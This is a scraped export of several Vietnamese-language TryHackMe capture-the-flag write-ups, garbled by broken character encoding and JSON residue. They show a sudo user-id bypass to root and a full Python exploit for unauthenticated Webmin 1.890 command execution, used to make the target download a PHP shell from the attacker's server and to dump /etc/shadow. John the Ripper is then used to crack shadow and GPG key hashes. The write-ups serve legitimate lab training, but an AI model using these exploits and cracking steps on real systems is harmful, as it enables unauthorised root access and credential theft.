ls /home/grecia/ user.txt Privilege escalation # VÃ¬ khÃ´ng cÃ³ manh má»‘i nÃ o Ä‘á»ƒ tÃ¬m ra password cá»§a user grecia nÃªn tÃ´i sáº½ thá»­ tÃ¬m cÃ¡c file cháº¡y dÆ°á»›i quyá»n root\nwww-data@ubuntu:/$ find / -type f -perm -u=s 2\u0026gt;/dev/null /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/bin/passwd /usr/bin/gpasswd /usr/bin/vmware-user-suid-wrapper /usr/bin/sudo /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /bin/ping /bin/umount /bin/ping6 /bin/fusermount /bin/mount /bin/su www-data@ubuntu:/$ KhÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t láº¯m. TÃ´i thá»­ kiá»ƒm tra phiÃªn báº£n sudo\nwww-data@ubuntu:/$ sudo -V Sudo version 1.8.16 Sudoers policy plugin version 1.8.16 Sudoers file grammar version 45 Sudoers I/O plugin version 1.8.16 www-data@ubuntu:/$ PhiÃªn báº£n nÃ y cÃ³ dÃ­nh lá»—i Security Bypass\nwww-data@ubuntu:/$ sudo -u#-1 /bin/bash root@ubuntu:/# id uid=0(root) gid=33(www-data) groups=33(www-data) root@ubuntu:/# ls /root root.txt root@ubuntu:/# Tá»•ng káº¿t # Qua bÃ i nÃ y, tÃ´i biáº¿t thÃªm vá» má»™t phÆ°Æ¡ng phÃ¡p trao Ä‘á»•i khÃ³a, tuy nÃ³ Ä‘Ã£ lá»—i thá»i vÃ  cÃ³ thá»ƒ giáº£i Ä‘Æ°á»£c bá»Ÿi nhá»¯ng ngÆ°á»i nghe lÃ©n, nhÆ°ng nÃ³ váº«n Ä‘Æ°á»£c phÃ¡t triá»ƒn vÃ  cÃ³ nhiá»u biáº¿n thá»ƒ an toÃ n hÆ¡n trong truyá»n thÃ´ng tin. NgoÃ i ra, tÃ´i cÅ©ng biáº¿t thÃªm má»™t lá»— há»•ng cá»§a PHP vá»›i hÃ m unserialize, lá»£i dá»¥ng thiáº¿t láº­p Ä‘áº§u vÃ o khÃ´ng an toÃ n Ä‘á»ƒ thá»±c thi RCE.\n","date":"2 March 2022","externalUrl":null,"permalink":"/ctf/tryhackme/stuxctf/","section":"Ctf","summary":"","title":"Tryhackme - StuxCTF","type":"ctf"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Source\nReconnaissance # Viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbZAxRhWUij6g6MP11OkGSk7vYHRNyQcTIdMmjj1kSvDhyuXS9QbM5t2qe3UMblyLaObwKJDN++KWfzl1+beOrq3sXkTA4Wot1RyYo0hPdQT0GWBTs63dll2+c4yv3nDiYAwtSsPLCeynPEmSUGDjkVnP12gxXe/qCsM2+rZ9tzXtSWiXgWvaxMZiHaQpT1KaY0z6ebzBTI8siU0t+6SMK7rNv1CsUNpGeicfbC5ZOE4/Nbc8cxNl7gDtZbyjdh9S7KTvzkSj2zBJ+8VbzsuZk1yy8uyLDgmuBQ6LzbYUNHkTQhJetVq7utFpRqLdpSJTcsz5PAxd1Upe9DqoYURuL | 256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEYCha8jk+VzcJRRwV41rl8EuJBiy7Cf8xg6tX41bZv0huZdCcCTCq9dLJlzO2V9s+sMp92TpzR5j8NAAuJt0DA= | 256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOJnY5oycmgw6ND6Mw4y0YQWZiHoKhePo4bylKKCP0E5 10000/tcp open http syn-ack MiniServ 1.890 (Webmin httpd) | http-methods: |_ Supported Methods: GET HEAD OPTIONS |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). |_http-favicon: Unknown favicon MD5: E9CE0E6E52BEA337BC56F2FD6BF4C996 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Vá»›i port 10000 tÃ´i cÃ³ web server vá»›i giao diá»‡n Webmin. TÃ´i thá»­ tÃ¬m exploit vá»›i webmin\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ searchsploit webmin ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- DansGuardian Webmin Module 0.x - \u0026#39;edit.cgi\u0026#39; Directory Traversal | cgi/webapps/23535.txt phpMyWebmin 1.0 - \u0026#39;target\u0026#39; Remote File Inclusion | php/webapps/2462.txt phpMyWebmin 1.0 - \u0026#39;window.php\u0026#39; Remote File Inclusion | php/webapps/2451.txt Webmin - Brute Force / Command Execution | multiple/remote/705.pl webmin 0.91 - Directory Traversal | cgi/remote/21183.txt Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing | linux/remote/22275.pl Webmin 0.x - \u0026#39;RPC\u0026#39; Privilege Escalation | linux/remote/21765.pl Webmin 0.x - Code Input Validation | linux/local/21348.txt Webmin 1.5 - Brute Force / Command Execution | multiple/remote/746.pl Webmin 1.5 - Web Brute Force (CGI) | multiple/remote/745.pl Webmin 1.580 - \u0026#39;/file/show.cgi\u0026#39; Remote Command Execution (Metasploit) | unix/remote/21851.rb Webmin 1.850 - Multiple Vulnerabilities | cgi/webapps/42989.txt Webmin 1.900 - Remote Command Execution (Metasploit) | cgi/remote/46201.rb Webmin 1.910 - \u0026#39;Package Updates\u0026#39; Remote Command Execution (Metasploit) | linux/remote/46984.rb Webmin 1.920 - Remote Code Execution | linux/webapps/47293.sh Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit) | linux/remote/47230.rb Webmin 1.962 - \u0026#39;Package Updates\u0026#39; Escape Bypass RCE (Metasploit) | linux/webapps/49318.rb Webmin 1.973 - \u0026#39;run.cgi\u0026#39; Cross-Site Request Forgery (CSRF) | linux/webapps/50144.py Webmin 1.973 - \u0026#39;save_user.cgi\u0026#39; Cross-Site Request Forgery (CSRF) | linux/webapps/50126.py Webmin 1.984 - Remote Code Execution (Authenticated) | linux/webapps/50809.py Webmin 1.996 - Remote Code Execution (RCE) (Authenticated) | linux/webapps/50998.py Webmin 1.x - HTML Email Command Execution | cgi/webapps/24574.txt Webmin \u0026lt; 1.290 / Usermin \u0026lt; 1.220 - Arbitrary File Disclosure | multiple/remote/1997.php Webmin \u0026lt; 1.290 / Usermin \u0026lt; 1.220 - Arbitrary File Disclosure | multiple/remote/2017.pl Webmin \u0026lt; 1.920 - \u0026#39;rpc.cgi\u0026#39; Remote Code Execution (Metasploit) | linux/webapps/47330.rb ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Vá»›i version 1.890, tÃ´i tháº¥y cÃ³ 1 lá»— há»•ng RCE cÃ³ thá»ƒ khai thÃ¡c vá»›i Metasploit. Tuy nhiÃªn sau 1 lÃºc kiá»ƒm tra thÃ¬ tÃ´i nháº­n ra cÃ¡c exploit nÃ y Ä‘á»u cáº§n cÃ³ username vÃ  password.\nDáº¡o quanh Google 1 lÃºc tÃ¬m cÃ¡c exploit cá»§a Webmin 1.890 thÃ¬ tÃ´i tÃ¬m tháº¥y 1 Poc unauthorizied RCE, nÃ³ á»Ÿ Ä‘Ã¢y, nÃ³ sáº½ táº¡o lá»‡nh curl chá»©a payload Ä‘á»ƒ server tráº£ vá» command vá»«a nháº­p\n#!/usr/bin/env python3 import os import sys STAIN = \u0026#34;\u0026#34;\u0026#34; -------------------------------- ______________ _____ __ / ___/_ __/ | / _/ | / / \\__ \\ / / / /| | / // |/ / ___/ // / / ___ |_/ // /| / /____//_/ /_/ |_/___/_/ |_/ -------------------------------- WebMin 1.890-expired-remote-root \u0026#34;\u0026#34;\u0026#34; usage = \u0026#34;\u0026#34;\u0026#34;Usage: python3 exploit.py HOST PORT COMMAND Ex: python3 exploit.py 10.0.0.1 10000 id \u0026#34;\u0026#34;\u0026#34; def exploit(target, port, url, command): header = \u0026#39;Referer: https://{}:{}/session_login.cgi\u0026#39;.format(target,port) payload = \u0026#39;user=gotroot\u0026amp;pam=\u0026amp;expired=2|echo \u0026#34;\u0026#34;;{}\u0026#39;.format(command) os.system(\u0026#34;curl -k {} -d \u0026#39;{}\u0026#39; -H \u0026#39;{}\u0026#39;\u0026#34;.format(url,payload,header)) if __name__ == \u0026#39;__main__\u0026#39;: try: print(STAIN) target = sys.argv[1] port = sys.argv[2] url = \u0026#34;https://\u0026#34;+target+\u0026#34;:\u0026#34;+port+\u0026#34;/password_change.cgi\u0026#34; command = sys.argv[3] exploit(target, port, url, command) except: print(STAIN) print(usage) Clone nÃ³ vá» tá»« github vÃ  thá»­ command id\nâ”Œâ”€â”€(neoã‰¿kali)-[~/WebMin-1.890-Exploit-unauthorized-RCE] â””â”€$ python webmin-1.890_exploit.py 10.10.171.241 10000 id -------------------------------- ______________ _____ __ / ___/_ __/ | / _/ | / / \\__ \\ / / / /| | / // |/ / ___/ // / / ___ |_/ // /| / /____//_/ /_/ |_/___/_/ |_/ -------------------------------- WebMin 1.890-expired-remote-root \u0026lt;h1\u0026gt;Error - Perl execution failed\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Your password has expired, and a new one must be chosen. uid=0(root) gid=0(root) groups=0(root) \u0026lt;/p\u0026gt; curl: (56) OpenSSL SSL_read: error:0A000126:SSL routines::unexpected eof while reading, errno 0 â”Œâ”€â”€(neoã‰¿kali)-[~/WebMin-1.890-Exploit-unauthorized-RCE] â””â”€$ Táº¡o local http server vá»›i python\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ python -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Sau Ä‘Ã³ thá»­ upload php shell lÃªn server\nâ”Œâ”€â”€(neoã‰¿kali)-[~/WebMin-1.890-Exploit-unauthorized-RCE] â””â”€$ python webmin-1.890_exploit.py 10.10.171.241 10000 \u0026#39;wget http://10.18.3.74:8000/shell.php\u0026#39; -------------------------------- ______________ _____ __ / ___/_ __/ | / _/ | / / \\__ \\ / / / /| | / // |/ / ___/ // / / ___ |_/ // /| / /____//_/ /_/ |_/___/_/ |_/ -------------------------------- WebMin 1.890-expired-remote-root \u0026lt;h1\u0026gt;Error - Perl execution failed\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Your password has expired, and a new one must be chosen. \u0026lt;/p\u0026gt; curl: (56) OpenSSL SSL_read: error:0A000126:SSL routines::unexpected eof while reading, errno 0 Quay láº¡i local http server Ä‘á»ƒ kiá»ƒm tra\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ python -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.171.241 - - [30/Aug/2022 05:12:22] \u0026#34;GET /shell.php HTTP/1.1\u0026#34; 200 - NhÆ° váº­y lÃ  tÃ´i Ä‘Ã£ upload thÃ nh cÃ´ng. Tuy nhiÃªn sau bao ná»— lá»±c tÃ´i cÅ©ng khÃ´ng thá»ƒ láº¥y Ä‘Æ°á»£c rce Tuy nhiÃªn thÃ¬ vá»›i quyá»n root tÃ´i cÅ©ng cÃ³ toÃ n quyá»n Ä‘á»ƒ xem cÃ¡c thÆ° má»¥c\nTrong thÆ° má»¥c home tÃ´i tÃ¬m tháº¥y user dark vÃ  user flag náº±m trong thÆ° má»¥c cá»§a user nÃ y.\nâ”Œâ”€â”€(neoã‰¿kali)-[~/WebMin-1.890-Exploit-unauthorized-RCE] â””â”€$ python webmin-1.890_exploit.py 10.10.171.241 10000 \u0026#39;ls -la /home/dark\u0026#39; -------------------------------- ______________ _____ __ / ___/_ __/ | / _/ | / / \\__ \\ / / / /| | / // |/ / ___/ // / / ___ |_/ // /| / /____//_/ /_/ |_/___/_/ |_/ -------------------------------- WebMin 1.890-expired-remote-root \u0026lt;h1\u0026gt;Error - Perl execution failed\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Your password has expired, and a new one must be chosen. total 15228 drwxr-xr-x 5 dark dark 4096 Jun 26 2020 . drwxr-xr-x 3 root root 4096 Jun 26 2020 .. -rw------- 1 dark dark 7 Jun 26 2020 .bash_history -rw-r--r-- 1 dark dark 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 dark dark 3771 Apr 4 2018 .bashrc drwx------ 2 dark dark 4096 Jun 26 2020 .cache drwx------ 3 dark dark 4096 Jun 26 2020 .gnupg drwxrwxr-x 3 dark dark 4096 Jun 26 2020 .local -rw-r--r-- 1 dark dark 807 Apr 4 2018 .profile -rw-r--r-- 1 dark dark 0 Jun 26 2020 .sudo_as_admin_successful -rw-rw-r-- 1 dark dark 29 Jun 26 2020 user.txt -rw-rw-r-- 1 dark dark 15550066 Jun 26 2020 webmin_1.890_all.deb \u0026lt;/p\u0026gt; curl: (56) OpenSSL SSL_read: error:0A000126:SSL routines::unexpected eof while reading, errno 0 CÃ²n root flag thÃ¬ hiá»ƒn nhiÃªn lÃ  náº±m trong thÆ° má»¥c root rá»“i, dÃ¹ng lá»‡nh cat Ä‘á»ƒ xem thÃ´i.\nThÃªm 1 Ä‘iá»u ná»¯a, chÃ­nh vÃ¬ tÃ´i lÃ  root nÃªn tÃ´i cÃ³ thá»ƒ xem Ä‘Æ°á»£c file shadow\nâ”Œâ”€â”€(neoã‰¿kali)-[~/WebMin-1.890-Exploit-unauthorized-RCE] â””â”€$ python webmin-1.890_exploit.py 10.10.171.241 10000 \u0026#39;cat /etc/shadow\u0026#39; -------------------------------- ______________ _____ __ / ___/_ __/ | / _/ | / / \\__ \\ / / / /| | / // |/ / ___/ // / / ___ |_/ // /| / /____//_/ /_/ |_/___/_/ |_/ -------------------------------- WebMin 1.890-expired-remote-root \u0026lt;h1\u0026gt;Error - Perl execution failed\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Your password has expired, and a new one must be chosen. root:*:18295:0:99999:7::: daemon:*:18295:0:99999:7::: bin:*:18295:0:99999:7::: sys:*:18295:0:99999:7::: sync:*:18295:0:99999:7::: games:*:18295:0:99999:7::: man:*:18295:0:99999:7::: lp:*:18295:0:99999:7::: mail:*:18295:0:99999:7::: news:*:18295:0:99999:7::: uucp:*:18295:0:99999:7::: proxy:*:18295:0:99999:7::: www-data:*:18295:0:99999:7::: backup:*:18295:0:99999:7::: list:*:18295:0:99999:7::: irc:*:18295:0:99999:7::: gnats:*:18295:0:99999:7::: nobody:*:18295:0:99999:7::: systemd-network:*:18295:0:99999:7::: systemd-resolve:*:18295:0:99999:7::: syslog:*:18295:0:99999:7::: messagebus:*:18295:0:99999:7::: _apt:*:18295:0:99999:7::: lxd:*:18295:0:99999:7::: uuidd:*:18295:0:99999:7::: dnsmasq:*:18295:0:99999:7::: landscape:*:18295:0:99999:7::: pollinate:*:18295:0:99999:7::: sshd:*:18439:0:99999:7::: dark:$6$in/.sNd9dVXME1Tc$9n0cOI6ZzYoYDvD.Zfopq4R4Q/sTDKG0j128H2oFZrctn7CnpZEJ3DQq0w4j9Ruq2osYTopTwx8xSaYnLKhK11:18439:0:99999:7::: \u0026lt;/p\u0026gt; curl: (56) OpenSSL SSL_read: error:0A000126:SSL routines::unexpected eof while reading, errno 0 VÃ  á»Ÿ Ä‘Ã¢y thÃ¬ tÃ´i cÃ³ hash password cá»§a user dark, káº¿t há»£p file passwd Ä‘á»ƒ unshadow vÃ  cuá»‘i cÃ¹ng dÃ¹ng john Ä‘á»ƒ crack hash vÃ  tÃ´i cÅ©ng sáº½ cÃ³ Ä‘Æ°á»£c password cá»§a user nÃ y vÃ  login báº±ng SSH.\n","date":"4 February 2022","externalUrl":null,"permalink":"/ctf/tryhackme/source/","section":"Ctf","summary":"","title":"Tryhackme - Source","type":"ctf"},{"content":"","date":"4 February 2022","externalUrl":null,"permalink":"/tags/webmin/","section":"Tags","summary":"","title":"Webmin","type":"tags"},{"content":"","date":"3 February 2022","externalUrl":null,"permalink":"/tags/gpg/","section":"Tags","summary":"","title":"Gpg","type":"tags"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Anonforce\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ\nPORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.18.3.74 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxr-xr-x 2 0 0 4096 Aug 11 2019 bin | drwxr-xr-x 3 0 0 4096 Aug 11 2019 boot | drwxr-xr-x 17 0 0 3700 Aug 28 03:38 dev | drwxr-xr-x 85 0 0 4096 Aug 13 2019 etc | drwxr-xr-x 3 0 0 4096 Aug 11 2019 home | lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img -\u0026gt; boot/initrd.img-4.4.0-157-generic | lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img.old -\u0026gt; boot/initrd.img-4.4.0-142-generic | drwxr-xr-x 19 0 0 4096 Aug 11 2019 lib | drwxr-xr-x 2 0 0 4096 Aug 11 2019 lib64 | drwx------ 2 0 0 16384 Aug 11 2019 lost+found | drwxr-xr-x 4 0 0 4096 Aug 11 2019 media | drwxr-xr-x 2 0 0 4096 Feb 26 2019 mnt | drwxrwxrwx 2 1000 1000 4096 Aug 11 2019 notread [NSE: writeable] | drwxr-xr-x 2 0 0 4096 Aug 11 2019 opt | dr-xr-xr-x 94 0 0 0 Aug 28 03:38 proc | drwx------ 3 0 0 4096 Aug 11 2019 root | drwxr-xr-x 18 0 0 540 Aug 28 03:38 run | drwxr-xr-x 2 0 0 12288 Aug 11 2019 sbin | drwxr-xr-x 3 0 0 4096 Aug 11 2019 srv | dr-xr-xr-x 13 0 0 0 Aug 28 03:38 sys | drwxrwxrwt 9 0 0 4096 Aug 28 03:38 tmp [NSE: writeable] | drwxr-xr-x 10 0 0 4096 Aug 11 2019 usr | drwxr-xr-x 11 0 0 4096 Aug 11 2019 var | lrwxrwxrwx 1 0 0 30 Aug 11 2019 vmlinuz -\u0026gt; boot/vmlinuz-4.4.0-157-generic |_lrwxrwxrwx 1 0 0 30 Aug 11 2019 vmlinuz.old -\u0026gt; boot/vmlinuz-4.4.0-142-generic 22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDkGQ8G5TDLFJY+zMp5dEj6XUwoH7ojGBjGkOmAf6d9PuIsf4DPFJQmoCA/eiSZpIwfQ14hVhXJHTclmcCd+2OeriuLXq0fEn+aHTo5X82KADkJibmel86qS7ToCzcaROnUkJU17mY3MuyTbfxuqmSvTv/7NI0zRW+cJ+cqwmeSZyhLnOHZ9GT5Y3Lbpvt2w0ktQ128POyaO4GrGA0EERWstIxExpqLaLsqjQPE/hBnIgZXZjd6EL1gn1/CSQnJVdLesIWMcvT5qnm9dZn/ysvysdHHaHylCSKIx5Qu9LtsitssoglpDlhXu5kr2do6ncWMAdTW75asBh+VE+QVX3vV | 256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAq1VuleOFZpJb73D/25H1l0wp9Cs/SGwWIjwtGW0/2/20+xMsac5E8rACtXtLaAuL3Dk/IRSrORuEfU11R0H3A= | 256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIiId/YCdJZgD4/DG314U2CpAu8Y13DAx7AQ+JX+3zVc Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ÄÄƒng nháº­p vÃ o FTP vá»›i port 21\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ftp 10.10.219.60 Connected to 10.10.219.60. 220 (vsFTPd 3.0.3) Name (10.10.219.60:neo): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||55094|) 150 Here comes the directory listing. drwxr-xr-x 2 0 0 4096 Aug 11 2019 bin drwxr-xr-x 3 0 0 4096 Aug 11 2019 boot drwxr-xr-x 17 0 0 3700 Aug 28 03:38 dev drwxr-xr-x 85 0 0 4096 Aug 13 2019 etc drwxr-xr-x 3 0 0 4096 Aug 11 2019 home lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img -\u0026gt; boot/initrd.img-4.4.0-157-generic lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img.old -\u0026gt; boot/initrd.img-4.4.0-142-generic drwxr-xr-x 19 0 0 4096 Aug 11 2019 lib drwxr-xr-x 2 0 0 4096 Aug 11 2019 lib64 drwx------ 2 0 0 16384 Aug 11 2019 lost+found drwxr-xr-x 4 0 0 4096 Aug 11 2019 media drwxr-xr-x 2 0 0 4096 Feb 26 2019 mnt drwxrwxrwx 2 1000 1000 4096 Aug 11 2019 notread drwxr-xr-x 2 0 0 4096 Aug 11 2019 opt dr-xr-xr-x 92 0 0 0 Aug 28 03:38 proc drwx------ 3 0 0 4096 Aug 11 2019 root drwxr-xr-x 18 0 0 540 Aug 28 03:38 run drwxr-xr-x 2 0 0 12288 Aug 11 2019 sbin drwxr-xr-x 3 0 0 4096 Aug 11 2019 srv dr-xr-xr-x 13 0 0 0 Aug 28 03:38 sys drwxrwxrwt 9 0 0 4096 Aug 28 03:38 tmp drwxr-xr-x 10 0 0 4096 Aug 11 2019 usr drwxr-xr-x 11 0 0 4096 Aug 11 2019 var lrwxrwxrwx 1 0 0 30 Aug 11 2019 vmlinuz -\u0026gt; boot/vmlinuz-4.4.0-157-generic lrwxrwxrwx 1 0 0 30 Aug 11 2019 vmlinuz.old -\u0026gt; boot/vmlinuz-4.4.0-142-generic 226 Directory send OK. ftp\u0026gt; cd notread 250 Directory successfully changed. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||48550|) 150 Here comes the directory listing. -rwxrwxrwx 1 1000 1000 524 Aug 11 2019 backup.pgp -rwxrwxrwx 1 1000 1000 3762 Aug 11 2019 private.asc 226 Directory send OK. ftp\u0026gt; Trong ftp server tÃ´i Ä‘á»ƒ Ã½ tháº¥y cÃ³ 1 thÆ° má»¥c tÃªn notread khÃ¡ thÃº vá»‹. VÃ  bÃªn trong nÃ³ cÃ³ 1 file pgp vÃ  asc. Láº¥y 2 file nÃ y vá» vÃ  sá»­ dá»¥ng gpg Ä‘á»ƒ giáº£i mÃ£ nÃ³\nÄá»c thÃªm: How to export and import keys with GPG\nTuy nhiÃªn khi import key asc, tÃ´i cáº§n passphrase. Váº­y lÃ  táº¡m thá»i chÆ°a thá»ƒ decrypt Ä‘Æ°á»£c file backup nÃ y. Tuy nhiÃªn vá»›i ftp server nÃ y, tÃ´i cÃ³ thá»ƒ truy cáº­p toÃ n quyá»n cÃ¡c thÆ° má»¥c khÃ¡c vÃ  cÃ³ thá»ƒ láº¥y chÃºng vá» local machine.\nVÃ o thÆ° má»¥c home, trong Ä‘Ã¢y cÃ³ user melodias, trong user nÃ y tÃ´i tÃ¬m Ä‘Æ°á»£c user flag.\nftp\u0026gt; cd /home 250 Directory successfully changed. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||45519|) 150 Here comes the directory listing. drwxr-xr-x 4 1000 1000 4096 Aug 11 2019 melodias 226 Directory send OK. ftp\u0026gt; cd melodias 250 Directory successfully changed. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||18796|) 150 Here comes the directory listing. -rw-rw-r-- 1 1000 1000 33 Aug 11 2019 user.txt 226 Directory send OK. ftp\u0026gt; get user.txt local: user.txt remote: user.txt 229 Entering Extended Passive Mode (|||28508|) 150 Opening BINARY mode data connection for user.txt (33 bytes). 100% |************************************************************************************************************************************************| 33 27.19 KiB/s 00:00 ETA 226 Transfer complete. 33 bytes received in 00:00 (0.15 KiB/s) ftp\u0026gt; Sau 1 thá»i gian khÃ¡ dÃ i vÃ  thá»­ nhiá»u cÃ¡ch khÃ¡c nhau vÃ  Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£, tÃ´i quay trá»Ÿ láº¡i vá»›i 2 file pgp. Sá»­ dá»¥ng john Ä‘á»ƒ crack nÃ³\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ gpg2john private.asc \u0026gt; pgp.hash File private.asc â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ john pgp.hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 65536 for all loaded hashes Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status ******* (anonforce) 1g 0:00:00:00 DONE (2022-08-28 07:19) 5.000g/s 4640p/s 4640c/s 4640C/s butterfly1..xbox360 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Thá»­ import láº¡i vá»›i passphrase vá»«a tÃ¬m Ä‘Æ°á»£c vÃ  decypt file backup\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ gpg --import private.asc gpg: key B92CD1F280AD82C2: \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; not changed gpg: key B92CD1F280AD82C2: secret key imported gpg: key B92CD1F280AD82C2: \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; not changed gpg: Total number processed: 2 gpg: unchanged: 2 gpg: secret keys read: 1 gpg: secret keys imported: 1 â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ gpg --decrypt backup.pgp gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12 \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.********************************:18120:0:99999:7::: daemon:*:17953:0:99999:7::: bin:*:17953:0:99999:7::: sys:*:17953:0:99999:7::: sync:*:17953:0:99999:7::: games:*:17953:0:99999:7::: man:*:17953:0:99999:7::: lp:*:17953:0:99999:7::: mail:*:17953:0:99999:7::: news:*:17953:0:99999:7::: uucp:*:17953:0:99999:7::: proxy:*:17953:0:99999:7::: www-data:*:17953:0:99999:7::: backup:*:17953:0:99999:7::: list:*:17953:0:99999:7::: irc:*:17953:0:99999:7::: gnats:*:17953:0:99999:7::: nobody:*:17953:0:99999:7::: systemd-timesync:*:17953:0:99999:7::: systemd-network:*:17953:0:99999:7::: systemd-resolve:*:17953:0:99999:7::: systemd-bus-proxy:*:17953:0:99999:7::: syslog:*:17953:0:99999:7::: _apt:*:17953:0:99999:7::: messagebus:*:18120:0:99999:7::: uuidd:*:18120:0:99999:7::: melodias:$1$xDhc6S6G$IQHUW5Z***************:18120:0:99999:7::: sshd:*:18120:0:99999:7::: ftp:*:18120:0:99999:7::: Váº­y lÃ  tÃ´i cÃ³ hash password cá»§a user melodias vÃ  root. Sao chÃ©p ná»™i dung file backup.pgp vÃ  dÃ¡n nÃ³ vÃ o 1 file má»›i, tÃ´i Ä‘áº·t tÃªn lÃ  shadow Thá»­ decrypt nÃ³ vá»›i john\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ john shadow --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt Warning: only loading hashes of type \u0026#34;sha512crypt\u0026#34;, but also saw type \u0026#34;md5crypt\u0026#34; Use the \u0026#34;--format=md5crypt\u0026#34; option to force loading hashes of that type instead Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status ****** (root) 1g 0:00:00:03 DONE (2022-08-28 07:31) 0.2590g/s 1790p/s 